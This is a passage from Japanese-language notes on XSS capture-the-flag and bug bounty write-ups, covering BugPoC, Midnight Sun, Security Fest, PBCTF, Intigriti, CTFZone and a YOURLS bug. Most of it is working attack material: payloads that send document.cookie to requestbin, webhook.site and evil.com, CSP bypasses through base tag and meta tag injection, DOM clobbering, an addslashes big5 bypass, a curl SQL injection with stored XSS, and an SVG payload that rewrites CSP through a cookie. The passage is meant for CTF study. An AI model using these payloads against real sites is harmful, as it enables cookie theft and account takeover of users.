http://78.46.224.80:1337/download.php?zip=<script>eval("location\x2ehref=\"http://requestb\x2ein/18o1k6g1?\"+document\x2ecookie;")</script>

// IPアドレスを数値に直す
// window.locationをwindow["location"]に、document.cookieをdocument["cookie"]に
// "string" + "string" -> "string"["concat"]("string")
<script>window["location"] = "http://1558071511/itWorks!"["concat"](document["cookie"]) </script>
```
ちなみに、XMLHttpRequestでflag.zipをゲットする方針では、CSRFトークン付きでないとダメなので、CSRFトークンを取得してからじゃないとダメでめんどくさい…   

## Base tag Injection / CSP bypass / DOM clobbering (BugPoC XSS CTF November 2020) 
https://klefz.se/2020/11/10/bugpoc-xss-ctf-november-2020-write-up/   
環境がまだ動いてる。   
- **entrypoint**   
![image](https://user-images.githubusercontent.com/56021519/103559132-0012fe00-4ef9-11eb-9b9d-e66b77f7472c.png)   
入力した値をキラキラに装飾したものを返す。ソースを見ると、以下のようにiframeのsrcでparam=の形で送信されてるっぽい。   
```html
<iframe src="frame.html?param=Hello, World!" name="iframe" id="theIframe"></iframe>
```
でもaaaとかを入力したときはどうなるかというと、Chromeの開発者ツールで[Network]でJSに絞って検索すると`script.js`,`frame-analytics.js`の二つがある（他はgoogle系のJSなので多分無関係）ので、二つをチェックする。   
**script.js**  
```js
	var isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
	if (!isChrome){
		document.body.innerHTML = `
			<h1>Website Only Available in Chrome</h1>
			<p style="text-align:center"> Please visit <a href="https://www.google.com/chrome/">https://www.google.com/chrome/</a> to download Google Chrome if you would like to visit this website</p>.
		`;
	}
	
	document.getElementById("txt").onkeyup = function(){
		this.value = this.value.replace(/[&*<>%]/g, '');
	};


	document.getElementById('btn').onclick = function(){
		val = document.getElementById('txt').value;
		document.getElementById('theIframe').src = '/frame.html?param='+val;
	};
```
**frame-analytics.js**  
```html
console.log('Frame Analytics Script Securely Loaded');
console.log('User Agent String: ' + navigator.userAgent);
console.log('User Agent Vendor: ' + navigator.vendor);
console.log('User OS: ' + navigator.platform);
console.log('User Language: ' + navigator.language);
```
したがって、`script.js`で`replace(/[&*<>%]/g, '');`によって`onkeyup`イベントが発生すると`&*<>%`を空白に置換した文字列を`param=`にセットして`frame.html`に送信していることがわかる。  
したがって、次は`frame.html`を見て入力がどうセットされているかを確認する。  
開発者ツールのConsole上で`window.name="iframe"`としてから、`frame.html?param=<h1>aaaaa</h1>`として送信してみると以下の二か所に埋め込まれる。  
```html
	<head>
		<meta charset="UTF-8">
		<title>
			<h1>aaaa</h1>
		</title>
```
```html
		<section role="container">

			<div role="main">
				<p class="text" data-action="randomizr">&lt;h1&gt;aaaa&lt;/h1&gt;</p>
			</div>
```
下の方はエスケープされているので上の方でXSSができそう！！   
`frame.html?param=</title><script>alert(1)</script>`としてアクセスするとちゃんと埋め込めるが、開発者ツールで以下のようなCSPエラーが発生している！  
![image](https://user-images.githubusercontent.com/56021519/103560702-89c3cb00-4efb-11eb-8ffd-86732a37c6ab.png)  
CSPに以下のようなルールがセットされているため、`script-src`でインラインスクリプトの実行を禁止されている。  
```txt
content-security-policy: script-src 'nonce-bccqgzkdrrmg' 'strict-dynamic'; frame-src 'self'; object-src 'none';
```
したがって、CSPをバイパスする必要がある！  
これをCSP Evaluatorで調べるとBase tag injectionができることがわかる。  
![image](https://user-images.githubusercontent.com/56021519/103560889-ef17bc00-4efb-11eb-882f-cb644d47f217.png)   
したがって、正規の`files/analytics/js/frame-analytics.js`の代わりにBase tag injectionによって偽の`frame-analytics.js`を読み込ませることを考える。  
つまり、以下を送信して、  
```txt
</title><base href="http://localhost:4444/">
```
WSL上で偽の`frame-analytics.js`を作成してNode.jsコマンドのhttp-serverを使って  
```txt
http-server -p 4444 --cors -a 127.0.0.1
```
のように用意すると、以下のようにエラーが発生する。   
![image](https://user-images.githubusercontent.com/56021519/103562612-b75e4380-4efe-11eb-9c1b-b4b0997292f2.png)   
  
  
`frame-analytics.js`は以下のように埋め込まれているため、`integrity`で`frame-analytics.js`のSHA256ハッシュが埋め込まれているものと一致していないとerrorとなってしまう。     
![image](https://user-images.githubusercontent.com/56021519/103561484-ed022d00-4efc-11eb-923f-adf9d24d20dc.png)   
該当するソースは以下。`if(fileIntegrity.value)`で`fileIntegrity.value`が定義されていれば`frame-analytics.js`をsrcから読み込むようなintegrity付きのscriptタグを作成する。  
`fileIntegrity.value`は`window.fileIntegrity || {`で、もし`window.fileIntegrity`が定義されていなければ作成している。  
```html
	<script nonce="msatygrlbosu">
	
		window.fileIntegrity = window.fileIntegrity || {
			'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
			'algorithm' : 'sha256',
			'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
			'creationtime' : 1602687229
		}
	
		// verify we are in an iframe
		if (window.name == 'iframe') {
			
			// securely load the frame analytics code
			if (fileIntegrity.value) {
				
				// create a sandboxed iframe
				analyticsFrame = document.createElement('iframe');
				analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
				analyticsFrame.setAttribute('class', 'invisible');
				document.body.appendChild(analyticsFrame);

				// securely add the analytics code into iframe
				script = document.createElement('script');
				script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
				script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
				script.setAttribute('crossorigin', 'anonymous');
				analyticsFrame.contentDocument.body.appendChild(script);
				
			}

		} else {
			document.body.innerHTML = `
			<h1>Error</h1>
			<h2>This page can only be viewed from an iframe.</h2>
			<video width="400" controls>
				<source src="movie.mp4" type="video/mp4">
			</video>`
		}
		
	</script>
```
ここで、`window.fileIntegrity = window.fileIntegrity || {`の部分にDOM clobberingの脆弱性があるらしく、事前にDOM clobberingで`window.fileIntegrity`を定義してしまえばscriptの先頭の初期化する処理は実行されないことになる！  
```txt
// これを送信する
?param=</title><a id=fileIntegrity><a id=fileIntegrity name=value href=x></a>

// Consoleで　fileIntegrity.value　と入力して値を確認すると、以下が値としてセットされている！
<a id="fileIntegrity" name="value" href="x"></a>
```
ここから先は以下のようなエラーが発生してintegrityのチェックで失敗しているがこれを突破する方法がなんかよく理解できなかった…  
![image](https://user-images.githubusercontent.com/56021519/103562796-01dfc000-4eff-11eb-96ed-918f6697297c.png)   

- **Payload**   
以下で動くことになっているが、よくわからん…  
```js
window.name = 'iframe';
window.location = 'https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://<id>.redir.bugpoc.ninja%22%3E%3Ca%20id=fileIntegrity%3E%3Ca%20id=fileIntegrity%20name=value%20href=x%3E'
```
## CSS Injection (SECCON 2018 Online GhostKingdom)
XSSではないので省略   
https://techblog.securesky-tech.com/entry/2018/10/31/2   

## DOM clobbering / CSP bypass in meta tag / jQuery before 3.0.0 (Midnight Sun CTF 2019 Finals Marcololo)
https://tasteofsecurity.com/security/ctf-midnight-marcololo/
- **entrypoint**   
```html
<html><head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/static/style.css">
    <meta property="og:title" content="marcoloco">
    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
    <script src="/api/getuser"></script>
<script>

if(user.name == "admin"){
  $.get(location.hash.slice(1));
}else{
  document.write("u are not admin, fak off");
}

</script></head>
```
の`<meta property="og:title" content="marcoloco">`のcontent内に値を挿入できるが、`<`,`>`が使用できない。  
なのでmetaタグを閉じることができないが、`0; url=http://evil.xss" http-equiv=“refresh`を送信すればオープンリダイレクトさせることはできる！  
また、jqueryの3.0.0以下のバージョンではAjax通信先のデータをJSとしてリクエスト先ではなくリクエスト元のオリジンで実行できてしまう脆弱性(CVE-2015-9251)がある。  
```txt
jQuery before 3.0.0 is vulnerable to Cross-site Scripting (XSS) attacks when a cross-domain Ajax request is performed without the dataType option, causing text/javascript responses to be executed.
```
したがって、ハッシュ以降に`#http://evli.com/evil.js`みたいな感じでアクセスさせられればXSSできそう！  
したがって、`if(user.name == "admin")`の条件に入る必要がある！  
以下のようにDOM clobberingを使えば、`user.name`に`admin`が入る！  
```html
<meta property="og:title" content name="admin" id="user">
```
しかし、`<script src="/api/getuser">`によって`user = {"id":"-1", "name": "guest", "type": "guest"}`が返るので上書きされてしまう！  
ここで、metaタグ内でCSPを定義してこの`/api/getuser`が読み込まれないように設定する！  
```txt
<meta property="og:title" content="script-src 'unsafe-inline' 'unsafe-eval' https://code.jquery.com;" http-equiv="Content-Security-Policy" >
```
したがって、`alert(1)`が書かれたalert.jsをngrokを使って外部からアクセスできるようにして、`#http://e7b7a03e9977.ngrok.io/alert.js`みたいにしてアクセスすれば`alert(1)`が呼び出し元のオリジンで実行できる！  
なお、`/etc/nginx/mime.types`の8行目を以下のように変更してCVE-2015-9251が発動できるようにしておく！  
```txt
text/javascript                       js;
```

- **概要**   
検証するためにDockerで似たような環境を再現した。  
https://github.com/mochizukikotaro/docker-nginx-phpfpm/blob/master/docker-compose.yml   
を参考にした。  
**midnight.php**  
php-fpmコンテナ内の`/var/www/html/`に配置する。  
```php
<!DOCTYPE html>
<html><head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/static/style.css">
    <meta property="og:title" content=<?php echo $_GET["input"] ?>>
    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
    <script src="/getuser.js"></script>
<script>

if(user.name == "admin"){
  $.get(location.hash.slice(1));
}else{
  document.write("u are not admin, fak off");
}
 
</script></head>


<body>
<?php echo htmlspecialchars($_GET["input"],ENT_QUOTES) ?>
</body></html>
```
**getuser.js**  
nginxコンテナ内に`/var/www/html`を作成してその中に入れた。  
```js
user = {"id":"-1", "name": "guest", "type": "guest"};
```
**ngrok**  
ローカルのDockerで動いている`http://192.168.99.100:8080/`を外部に公開して外部からアクセスできるようにする。  
```txt
$ ./ngrok http http://192.168.99.100:8080/
ngrok by @inconshreveable                                                (Ctrl+C to quit)                                                                                         Session Status                online                                                     Session Expires               6 hours, 21 minutes                                        Version                       2.3.35                                                     Region                        United States (us)                                         Web Interface                 http://127.0.0.1:4040                                      Forwarding                    http://e7b7a03e9977.ngrok.io -> http://192.168.99.100:8080/Forwarding                    https://e7b7a03e9977.ngrok.io -> http://192.168.99.100:8080                                                                                         Connections                   ttl     opn     rt1     rt5     p50     p90                                              3       0       0.00    0.00    65.65   104.06   
```
  
DOM clobberingについては、以下のような挙動をしており、`name`でないと`"admin"`が格納されていなかった…理由はよくわからん  
```txt
// これならDOM clobberingが成功してuser.nameに"admin"が入った！(Chrome上でも)
<meta property="og:title" content="" name="admin" id="user">
user.name
admin

// user.valueに"admin"が入らなかった…
<meta property="og:title" content value="admin" id="user">
user.value
undefined
user.name
""

// file.valueに"admin"が入るのかと思ったけどそうはなっていなかった…
<meta property="og:title" content value="admin" id="file">
file.value
undefined

// user.name1に"admin"が入らなかった…
<meta property="og:title" content name1="admin" id="user">
user.name
""
user.name1
undefined

// file.nameに"admin"が入ってる！どうやら ???.nameに任意の値を代入できるだけっぽい？
<meta property="og:title" content name="admin" id="file">
file.name
"admin"

// <a id=fileIntegrity><a id=fileIntegrity name=value href=x>を入れようとしたらBugPocみたいな感じでうまく行かなかった…
fileIntegrity.value
<a id=fileIntegrity name=value href=x>...</a>  // xが値として入っていない！

```
- **Payload**   
```txt
http://e7b7a03e9977.ngrok.io/midnight.php?input=%22script-src%20%27unsafe-inline%27%20%27unsafe-eval%27%20https://code.jquery.com;%22%20http-equiv=%22Content-Security-Policy%22%20name=%22admin%22%20id=%22user%22%3E%3C!--#http://e7b7a03e9977.ngrok.io/alert.js
```
![image](https://user-images.githubusercontent.com/56021519/103630620-46ae3a00-4f85-11eb-89ac-be806a414b93.png)  

## bypass with HTML entity, ES6 unicode / DOM clobbering / iframe (Security Fest 2019 CTF, entropian)
https://medium.com/@renwa/security-fest-2019-ctf-entropian-web-write-up-f81fb11f675b  
- **entrypoint**   
この問題の目標はadminのクローラにURLを提出することで、adminのCookieをゲットすることである？？？(たぶん…)  
  
`input=<h1>abc</h1>`を入力すると`<h1>abc/`となって同じ文字は二回目以降は削除されるが、XSSが可能である！  
`<script>`,`<link rel=import href=\/domain>`は同じ文字が出現するので、使えない。  
そのため、`<svg/onloAd=alret(1)>`で成功する。大文字と小文字を使い分ける。しかしこの大文字と小文字で同じ文字として認識するのはHTMLとしてだけで、Javascriptでは区別するためこの方法は使えない。  
したがって、`<svg/onloAd=eval(name)>`としてDOM clobberingによって`window.name = "alert(document.domain)"`とすれば、HTMLのwindowオブジェクトのnameの値がJavascriptの変数nameとして使えるため、`eval("alert(document.domain)")`が実行できる！  
  
`<svg/onloAd=eval(name)>`の中の`name`のうち`a`,`e`が二回使われているのでバイパスしないといけない。aはHTMLエンティティ`&#97`、eはES6 unicode literals`\u{65}`でバイパスするらしい。  
  
`<iframe src=/evil.html>`として`evil.html`の内容を以下のようにすれば、iframeを挿入した元に`<script>`が埋め込まれるので`alert(document.domain)`が実行できる。  
```html
<script>
alert(document.domain);
</script>
```
ただし、これだとadminのセッションではないのでadminのCookieはゲットできない…  
  
adminに以下の`evil.html`を実行させて、`window.name`にXSSPayloadをセットした状態で`http://192.168.99.100:8080/midnight.php?input=""><svg onload=eval(name)></svg><!--`にアクセスすれば`eval(alert(document.domain))`をadminのセッションで実行できる？  
```html
<script>
window.name = "alert(document.domain)";
window.location = "http://192.168.99.100:8080/midnight.php?input=%22%22%3E%3Csvg%20onload=eval(name)%3E%3C/svg%3E%3C!--"
</script>
```
問題設定がよくわからん…  

- **Payload**   
```txt
<iframe src=/\PSHTA.ML>
```
```html
<script>
window.name=”document.location=’https://webhook.site/*hash*?'+document.cookie";
window.location=”http://entropian-01.pwn.beer:3001/entropian?input=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E"
</script>
```
## XSS in title form / bypass blacklist \<script> (HackerOne CTF：Micro-CMS v1)
https://mnorris.io/hackerone%20ctf/h1_Micro-CMS_v1/  
- **entrypoint**   
`/page/create/2`とかでページをフォームから入力して、「タイトル」、「ページの内容」を送信できるページがある。  
「ページの内容」フォーム内では`<script>`タグが弾かれているが`<button onclick=alert('XSS')>Some button</button>`,`<img src='whatever' onclick=alert('XSS')>`みたいなそれ以外ではJSが実行できる。  
また、「タイトル」内では`<script>`がサニタイジングされずにTOPページに埋め込まれるのでXSSができる。  

## bypass addslashes() with %bf%5c$22 / Prototype Polution (PBCTF 2020 - Ikea Name Generator)
https://w0y.at/category/writeup.html  
https://blog.jimmyli.us/articles/2020-12/PerfectBlueCTF-WebExploitaiton  
- **entrypoint**   
ルート上で`/?name=<name>`として送信した値が以下の`app.js`によって、`CONFIG.URL`の中身`/config.php?name=<name>`に設定されてPOSTで送信されて、JSONを返してそれを`iframe`を使って`sandbox.php`に渡しているらしい。  
```js
function createFromObject(obj) {
  var el = document.createElement("span");

  for (var key in obj) {
    el[key] = obj[key]
  }

  return el
}

function generateName() {

  var default_config = {
    "style": "color: red;",
    "text": "Could not generate name"
  }

  var output = document.getElementById('output')
  var req = new XMLHttpRequest();

  req.open("POST", CONFIG.url);
  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
  req.onreadystatechange = function () {

    if (req.readyState === XMLHttpRequest.DONE) {
      if (req.status === 200) {
        var obj = JSON.parse(req.responseText);
        var config = _.merge(default_config, obj)


        sandbox = document.createElement("iframe")
        sandbox.src = "/sandbox.php"
        var el = createFromObject({
          style: config.style,
          innerText: config.text
        })

        output.appendChild(sandbox)
        sandbox.onload = function () {
          sandbox.contentWindow.output.appendChild(el)
        }
      }
    }
  }

  req.send("name=" + CONFIG.name)
}

window.onload = function() {
  document.getElementById("button-submit").onclick = function() {
    window.location = "/?name=" + document.getElementById("input-name").value
  }

  generateName();
}
```
以下のようにCSPが適用されていることから、Angular.jsのCSP bypassか、Lodashのプロトタイプ汚染だと推測できるらしい。  
```txt
// /
Content-Security-Policy: default-src 'none';script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.4/lodash.min.js;connect-src 'self';frame-src 'self';img-src 'self';style-src 'self' https://maxcdn.bootstrapcdn.com/;base-uri 'none';

// /404.php
Content-Security-Policy: default-src 'none'

// /sandbox.php
Content-Security-Policy: default-src 'none';script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js;style-src 'self' https://maxcdn.bootstrapcdn.com/;connect-src https:;base-uri 'none';
```
プロトタイプ汚染による解法は以下を参照。  
https://blog.jimmyli.us/articles/2020-12/PerfectBlueCTF-WebExploitaiton  
  
以下では、入力された`/?name=<name>`が以下のように`CONFIG`オブジェクトにセットされるため、ここに`document.location = ...`みたいにしてXSSしようとしてみる。  
```js
CONFIG = {
  url: "/get_name.php",
  name: "John",             // ここ！
  url: "/404.php?msg=<data>"
}
```
`"`をバイパスできればJSON Injection的な感じで任意のフィールドを設定できるかもなのでそれを試すと、以下のように`\"`としてエスケープされる。  
```js
CONFIG = {
  url: "/get_name.php",
  name: "John\", url: \"\/404.php?msg=foobar"
}
```
ここで、もし`addslashes()`関数を使用してエスケープしているなら、`%bf%22`のような入力を`addslashes()`した場合、`%bf%5c%22`としてバックスラッシュ`%5c`が`"`の前に追加されるが、文字セットが`big5tbl`の場合、`%bf%5c`は漢字として扱われる。  
よって`"`をバイパスすることができる！以下参照  
https://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string  

- **Payload**   
```txt
// name=<script charset=big5 src=config.php?name=%bf%22,foo:window.location=`http://evil.com/${document.cookie}`<!--
http://ikea-name-generator.chal.perfect.blue/?name=%3Cscript%20charset=big5%20src=config.php?name=%bf%22,foo:window.location=`http://evil.com/${document.cookie}`%3c!--
```
これを送信すればCONFIGオブジェクトには以下のように新しいフィールドが作成されるのでXSSが発動する！  
```js
CONFIG = {
  url: "/get_name.php",
  name: "璞",
  foo: window.location=`http:\/\/evil.com\/${document.cookie}` // omitted <!-- for clarity
}
```
## Stored XSS in User-Agent Referer / SQL Injection / (Tips for bug bounty beginners from a real life experience)
https://renaudmarti.net/posts/first-bug-bounty-submission/  
- **entrypoint**   
以下のようにUser-Agentをサニタイジングほぼ無しでDBに格納しているため、SQLインジェクションの脆弱性がある。  
```js
// Log a redirect (for stats)
function yourls_log_redirect( $keyword ) {
if ( !yourls_do_log_redirect() )
return true;
global $ydb;
$table = YOURLS_DB_TABLE_LOG;

$keyword = yourls_sanitize_string( $keyword );
$referrer = ( isset( $_SERVER['HTTP_REFERER'] ) ? yourls_sanitize_url( $_SERVER['HTTP_REFERER'] ) : 'direct' );
$ua = yourls_get_user_agent();
$ip = yourls_get_IP();
$location = yourls_geo_ip_to_countrycode( $ip );

return $ydb->query( "INSERT INTO `$table` VALUES ('', NOW(), '$keyword', '$referrer', '$ua', '$ip', '$location')" );
}
```
```js
// Returns a sanitized a user agent string. Given what I found on http://www.user-agents.org/ it should be OK.
function yourls_get_user_agent() {
if ( !isset( $_SERVER['HTTP_USER_AGENT'] ) )
return '-';

$ua = strip_tags( html_entity_decode( $_SERVER['HTTP_USER_AGENT'] ));
$ua = preg_replace('![^0-9a-zA-Z\':., /{}\(\)\[\]\+@&\!\?;_\-=~\*\#]!', '', $ua );

return substr( $ua, 0, 254 );
}
```
また、Refererを統計ページで表示する機能があるため、Stored XSSもできることがわかる。  
- **Payload**   
```txt
curl http://yourls.local/ozh -H "User-Agent: test', '', ''), ('', NOW(), 'ozh', concat(char(60), 'script', char(62), 'alert(document.cookie);', char(60), '/script', char(62)), '', '', '') #"
```
## eval Injection / overwrite function with eval (calc -> alert,eval) (Intigriti's December XSS Challenge 2020)
https://medium.com/bugbountywriteup/intigritis-december-xss-challenge-2020-unintended-solution-8205b4a4b95b  
- **entrypoint**   
![image](https://user-images.githubusercontent.com/56021519/103669714-0ae29700-4fbc-11eb-9875-e579d4cbcfe6.png)  
`https://challenge-1220.intigriti.io/?num1=1&operator=%2B&num2=3`みたいな感じで計算を実行する。計算するということは`eval`があるのでは？？？と予測もできそう  
以下のJSで計算機を実装している。evalは`function calc`の最後に存在している。  
```js
window.name = "Intigriti's XSS challenge";

const operators = ["+", "-", "/", "*", "="];
function calc(num1 = "", num2 = "", operator = ""){
  operator = decodeURIComponent(operator);
  var operation = `${num1}${operator}${num2}`;
  document.getElementById("operation").value = operation;
  if(operators.indexOf(operator) == -1){
    throw "Invalid operator.";
  }
  if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){
    throw "No special characters."
  }
  if(operation.length > 20){
    throw "Operation too long.";
  }
  return eval(operation);
}

function init(){
  try{
    document.getElementById("result").value = calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator"));
  }
  catch(ex){
    console.log(ex);
  }
}

function getQueryVariable(variable) {
    window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
    var vars = searchQueryString.split('&');
    var value;
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split('=');
        if (decodeURIComponent(pair[0]) == variable) {
            value = decodeURIComponent(pair[1]);
        }
    }
    return value;
}

/*
 The code below is calculator UI and not part of the challenge
*/

window.onload = function(){
 init();
 var numberBtns = document.body.getElementsByClassName("number");
 for(var i = 0; i < numberBtns.length; i++){
   numberBtns[i].onclick = function(e){
     setNumber(e.target.innerText)
   };
 };
 var operatorBtns = document.body.getElementsByClassName("operator");
 for(var i = 0; i < operatorBtns.length; i++){
   operatorBtns[i].onclick = function(e){
     setOperator(e.target.innerText)
   };
 };

  var clearBtn = document.body.getElementsByClassName("clear")[0];
  clearBtn.onclick = function(){
    clear();
  }
}

function setNumber(number){
  var url = new URL(window.location);
  var num1 = getQueryVariable('num1') || 0;
  var num2 = getQueryVariable('num2') || 0;
  var operator = getQueryVariable('operator');
  if(operator == undefined || operator == ""){
    url.searchParams.set('num1', parseInt(num1 + number));
  }
  else if(operator != undefined){
    url.searchParams.set('num2', parseInt(num2 + number));
  }
  window.history.pushState({}, '', url);
  init();
}

function setOperator(operator){
  var url = new URL(window.location);
  if(getQueryVariable('num2') != undefined){ //operation with previous result
    url.searchParams.set('num1', calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator")));
    url.searchParams.delete('num2');
    url.searchParams.set('operator', operator);
  }
  else if(getQueryVariable('num1') != undefined){
    url.searchParams.set('operator', operator);
  }
  else{
    alert("You need to pick a number first.");
  }
  window.history.pushState({}, '', url);
  init();
}

function clear(){
    var url = new URL(window.location);
    url.searchParams.delete('num1');
    url.searchParams.delete('num2');
    url.searchParams.delete('operator');
    window.history.pushState({}, '', url);
    document.getElementById("result").value = "";
    init();
}
```
calcのなかでnum1,num2は英数字しか使えないようにし、operatorは`["+", "-", "/", "*", "="]`の中のどれかしか使えず、最終的には``var operation = `${num1}${operator}${num2}`;``として文字列を結合してから`return eval(operation);`でevalに挿入している。  
したがって、`=`は使えるので、`a=1`みたいなevalを実行すれば、Javascriptのaという変数に1という値を代入することができる。  
ここで、`eval=alert`とすれば、eval関数をalert関数でオーバーライド(上書き)することになる。  
```txt
https://challenge-1220.intigriti.io/?num1=eval&operator=%3D&num2=alert

// 上の状態で数字をクリックすると、以下のようなURLに変化しalertがポップする
https://challenge-1220.intigriti.io/?num1=eval&operator=%3D&num2=NaN
```
![image](https://user-images.githubusercontent.com/56021519/103670665-32862f00-4fbd-11eb-9bd9-900d5cfea409.png)  
  
`document.domain`をalertしたいが、num1には記号は使えないため、なんとかcalcの中のこの記号をはじく処理に到達する前にXSSしたい。calc関数そのものをalert関数に置き換えれば、`function calc(num1 = "", num2 = "", operator = "")`の第一引数num1が`alert(num1)`みたいにできる。  
ここで、1回目でcalcをalertに変換して2回目で置き換えたcalcを実行したい。  
以下のように置き換えた後に何かボタンを押してみると、num1の値の`calc`がalertされて、そこにdocument.domainをセットする方法がわからない…  
```txt
https://challenge-1220.intigriti.io/?num1=calc&operator=%3D&num2=alert
```
![image](https://user-images.githubusercontent.com/56021519/103671253-ff906b00-4fbd-11eb-8ac6-02dd00fe3869.png)  
  
ここで、`#`を使えばいけるらしい。  
以下のようにURLでアクセスした後にボタンを押すと、`calc`ではなく`undefined`が表示された。これは、`sometext`が二回目のcalcに入っているからである(細かい挙動はよくわからんけどとりあえずこうなったから多分そうなってるだろうってだけ)  
```txt
https://challenge-1220.intigriti.io/#sometext?num1=calc&operator=%3D&num2=alert
```
![image](https://user-images.githubusercontent.com/56021519/103671530-631a9880-4fbe-11eb-8c7b-1e0a79f862aa.png)  
  
じゃあ、`sometext`の場所を`num1=1`にして同じようにしてみると、先ほどと同じように`undefined`がalertされる。  
```txt
https://challenge-1220.intigriti.io/#num1=1?num1=calc&operator=%3D&num2=alert
```
じゃあ、`sometext`を`num1=1`じゃなくて`&num1=1`にすると、`1?num1`がalertされた！  
alertだと後ろに`?num1`っていうゴミが付いてきちゃうので、代わりにevalを使って、ごみの部分を`//`でコメントアウトする。  
```txt
https://challenge-1220.intigriti.io/#&num1=1?num1=calc&operator=%3D&num2=alert
```
これでXSS成功！  
```txt
https://challenge-1220.intigriti.io/#&num1=alert(document.domain);//?num1=calc&operator=%3D&num2=eval

// 上の状態で数字をクリックすると、以下のようなURLに変化しalertがポップする
https://challenge-1220.intigriti.io/?num2=NaN#&num1=alert(document.domain);//?num1=calc&operator=%3D&num2=eval
```
![image](https://user-images.githubusercontent.com/56021519/103672125-36b34c00-4fbf-11eb-9bdd-af009d00c913.png)  
- **Payload**   
```txt
https://challenge-1220.intigriti.io/#&num1=alert(document.domain);//?num1=calc&operator=%3D&num2=eval
```
## SVG image XSS / XSS chain / bypass Markdown / BootStrap before 4.1.2(CVE-2018-14041) (CTFZone 2019 Quals - Shop Task)
https://blog.blackfan.ru/2019/12/ctfzone-2019-shop.html  
- **entrypoint**   
「Title」「Text」「Select Image」でチケットのタイトルとテキスト本文と画像をアップロードできるWebサイトがある。adminのクローラにURLを送信する形式なので、URLを送信してXSSを発火させられればよい。  
画像をアップロードした先とチケットを投稿する先ではドメインが異なり、チケットの方はCSPルールがセットされており、XSSができない…  
SVG画像がアップできるので、アップロード先では以下のようにXSSができる！  
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(1);
  </script>
</svg>
```
チケットの投稿先では以下のCSPがセットされており、`$$cookie_scope$$`にはCookieのscopeという値がセットされるらしい。   
```txt
Content-Security-Policy: 
    default-src 'self'; 
    style-src 'self'; 
    img-src 'self' http://uploads.web-shop.ctfz.one; 
    report-uri /csp?scope=$$cookie_scope$$;
```
Cookieに以下のようにセットするとCSPルール内にInjectできる！  
```txt
Cookie: scope=%20//758608540/%20%3B%20script-src%20'unsafe-inline'%20'self'%20'unsafe-eval'%3B;
```
```txt
Content-Security-Policy: 
    default-src 'self'; 
    style-src 'self'; 
    img-src 'self' http://uploads.web-shop.ctfz.one; 
    report-uri /csp?scope= //758608540/; 
    script-src 'unsafe-inline' 'self' 'unsafe-eval';
```
したがって、画像アップロード先のXSSでチケット投稿先のCSPルールを改竄してチケット投稿先でもXSSできるようにする必要がある  
テキスト入力内では以下のようにマークダウンを書くと`>`がエスケープされずにHTMLとして出力される。  
```html
[xxx<xxx](http://xxx)

<a href="http://xxx">xxx<xxx</a>
```
このページではjquery-3.2.1.slim.min.js、popper.min.js、bootstrap.min.jsを使用しており、bootstrapの4.1.2以下のバージョンを使用している場合はXSSが可能である(CVE-2018-14041)！  https://github.com/twbs/bootstrap/issues/26627　　
以下は`#`以降の文字列をJSとしてevalで実行するXSSPayloadである  
```html
[x<x<x data-spy=scroll data-target=<img/src/onerror=eval(location.hash.slice(1))&gt; zz](http://)

<a href="http://">x<x&lt;x data-spy=scroll data-target=&lt;img/src/onerror=eval(location.hash.slice(1))&gt; zz</a>
```
したがって、以下のようにまずチケット投稿先ページでXSS(CSPがあるので今は発動しない)を仕込んで置き、そのあとにSVG画像によって画像アップロード先でXSSで、チケット投稿先のCSPを改竄しチケット投稿先のあらかじめ用意したMarkdownのXSSでadminにすべてのボタンをJqueryで押下させる！(flagが入っている投稿がadminにしか見えない形であるはずってことかな…？)  
```html
<!DOCTYPE html>
<html>
<body>
    <a href="http://">x<x&lt;x data-spy=scroll data-target=&lt;img/src/onerror=alert(document.domain)&gt; zz</a>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.slim.min.js"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
</html>
```
```xml
<svg ...>
  <script type="text/javascript">
    document.cookie="scope=%20//758608540/%20%3B%20script-src%20'unsafe-inline'%20'self'%20'unsafe-eval'%3B;domain=.web-shop.ctfz.one;path=/;";
    location="http://web-shop.ctfz.one/ticket/541c92e3-d1c5-47f0-9668-9d4c3f6c7dc1#jQuery('#inputText').val('pwn');jQuery('.btn').click();";
  </script>
</svg>
```
- **Payload**   
SVG画像によるXSS  
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    document.cookie="scope=%20//758608540/%20%3B%20script-src%20'unsafe-inline'%20'self'%20'unsafe-eval'%3B;domain=.web-shop.ctfz.one;path=/;";
    location="http://web-shop.ctfz.one/ticket/541c92e3-d1c5-47f0-9668-9d4c3f6c7dc1#jQuery('#inputText').val('pwn');jQuery('.btn').click();";
  </script>
</svg>
```
MarkdownによるBootstrap4.1.2以下のXSS  
```html
